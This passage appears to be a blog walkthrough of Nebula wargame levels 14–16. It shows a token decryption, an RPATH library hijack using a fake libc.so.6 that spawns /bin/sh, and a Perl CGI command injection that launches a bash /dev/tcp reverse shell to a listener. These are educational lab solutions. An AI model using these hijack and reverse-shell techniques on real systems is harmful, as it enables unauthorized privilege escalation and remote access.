&lt;p&gt;And now pipe the token into it&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level14@nebula:/home/flag14$ python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL&lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;MQPSRQWW.
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ ssh flag14@localhost

flag14@localhost&amp;#39;s password: 8457c118-887c-4e40-a5a6-33a25353165

flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-15:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 15&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.&lt;/p&gt;

&lt;p&gt;You may wish to review how to &amp;ldquo;compile a shared library in linux&amp;rdquo; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.&lt;/p&gt;

&lt;p&gt;Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After running &lt;code&gt;strace&lt;/code&gt; we notice this particular bit&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/home/flag15$ strace ./flag15
.
.
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbfdb8ba4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
.
.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s trying to load libc.so.6 from a specific location. Why is that? Let&amp;rsquo;s use &lt;code&gt;readelf&lt;/code&gt; to take a look&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;evel15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 .
 .
 .
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So it&amp;rsquo;s got an &lt;code&gt;RPATH&lt;/code&gt; to that location and as luck would have it we have write permissions to it. I guess we can create our own &lt;code&gt;libc.so.6&lt;/code&gt; in that directory and use it to execute some code - like get ourselves a flag15 shell. Let&amp;rsquo;s take a look at what symbols we&amp;rsquo;re actually using&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/home/flag15$ objdump -R flag15

flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So we&amp;rsquo;ve got a choice here between &lt;code&gt;__libc_start_main&lt;/code&gt; or &lt;code&gt;__gmon_start&lt;/code&gt;. As I am more comfortable with &lt;code&gt;__libc_start_main&lt;/code&gt; I&amp;rsquo;m going to go with this.&lt;/p&gt;

&lt;p&gt;So let us begin with the code for our library by looking up the &lt;a href=&#34;http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&#34;&gt;function declaration&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;linux/unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;__libc_start_main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;main)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; 
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;init)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fini)&lt;/span&gt; 
&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;rtld_fini)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;stack_end)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;In theory we should get a shell now&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Nuts, we have a symbol missing, namely &lt;code&gt;__cxa_finalize&lt;/code&gt;. Let&amp;rsquo;s add it an try again
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;linux/unistd.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;__cxa_finalize&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;d)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;__libc_start_main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;main)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; 
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;init)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fini)&lt;/span&gt; 
&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;rtld_fini)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;stack_end)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux&amp;rsquo;s demands. I searched around and found out about &lt;a href=&#34;http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html&#34;&gt;version scripts&lt;/a&gt;. Let&amp;rsquo;s hope it works&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/var/tmp/flag15$ cat version
GLIBC_2.0 { };
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;version
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sigh&lt;/em&gt; - symbol &lt;code&gt;system&lt;/code&gt; is missing. Ok, let&amp;rsquo;s just build it statically and wrap it all up so we&amp;rsquo;ve got everything we need. From &lt;code&gt;man gcc&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;-static-libgcc&lt;/strong&gt;
          On systems that provide libgcc as a shared library, these options force the use of either the shared or
          static version respectively.  If no shared version of libgcc
          was built when the compiler was configured, these options have no effect.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So really we can also get rid of our implementation of &lt;code&gt;__cxa_finalize&lt;/code&gt; as it&amp;rsquo;s all statically linked now.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;version,-Bstatic -o libc.so.6 mylibc.c
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ whoami
flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-16:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 16&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/env perl&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;CGI&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;qw{param}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;sub &lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;login&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$_[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$_[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=~&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tr&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;/a-z/&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;Z&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;  &lt;span style=&#34;color: #75715e&#34;&gt;# conver to uppercase&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=~&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;s/\s.*//&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;    &lt;span style=&#34;color: #75715e&#34;&gt;# strip everything after a space&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;@output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;`egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$line&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(@output)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;($usr,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$pw)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;split(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;/:/&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$line);&lt;/span&gt;
  

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($pw&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=~&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$password)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; 
      &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;sub &lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;htmlz&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($_[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;htmlz(login(param(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;param(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So quickly looking at the script we know that we need to pass &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called &lt;code&gt;userdb.txt&lt;/code&gt;. Taking a look at this file we notice it&amp;rsquo;s empty, so we need a different exploit. The obvious place here is the &lt;code&gt;egrep&lt;/code&gt; call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.&lt;/p&gt;

&lt;p&gt;One idea is to use bash&amp;rsquo;s feature that allows us to run a command with a wildcard in the path. For example you can run &lt;code&gt;/bin/ls&lt;/code&gt; with &lt;code&gt;/*/ls&lt;/code&gt; instead. This
gets us around the uppercase limitation as we can create an uppercase command
at a path we can write to. I&amp;rsquo;ve chosen &lt;code&gt;/tmp&lt;/code&gt; as my target.
I&amp;rsquo;m going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level16@nebula:~$ nc -l 1337
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;To create a netcat listener on port &lt;em&gt;1337&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Next I construct the payload for the script&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level16@nebula:/home/flag16$ cat /tmp/RSHELL
#!/bin/bash
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.101/1337 0&amp;gt;&amp;amp;1
level16@nebula:/home/flag16$ chmod +x /tmp/SHELL
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%60&lt;span style=&#34;color: #f8f8f2&#34;&gt;&amp;amp;password&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;test2
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Back in the shell where we launched the netcat listener we do the following (the &lt;code&gt;whoami&lt;/code&gt; is just to confirm I am the right user)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level16@nebula:~$ nc -l 1337
bash: no job control in this shell
flag16@nebula:/home/flag16$ getflag
getflag
You have successfully executed getflag on a target account
flag16@nebula:/home/flag16$ whoami
whoami
flag16
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

